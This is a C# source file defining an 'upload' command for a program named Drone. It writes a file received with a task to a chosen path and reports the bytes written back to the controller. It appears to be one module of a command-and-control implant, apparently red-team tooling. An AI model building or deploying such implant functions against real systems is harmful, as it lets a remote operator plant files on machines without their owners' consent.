using System.IO;
using Drone.Models;

namespace Drone.Functions;

public class Upload : DroneFunction
{
    public override string Name => "upload";
    
    public override void Execute(DroneTask task)
    {
        var path = task.Parameters[0];
        File.WriteAllBytes(path, task.Artefact);
        
        var info = new FileInfo(path);
        Drone.SendOutput(task.TaskId, $"Uploaded {task.Artefact.Length} bytes to {info.FullName}.");
    }
}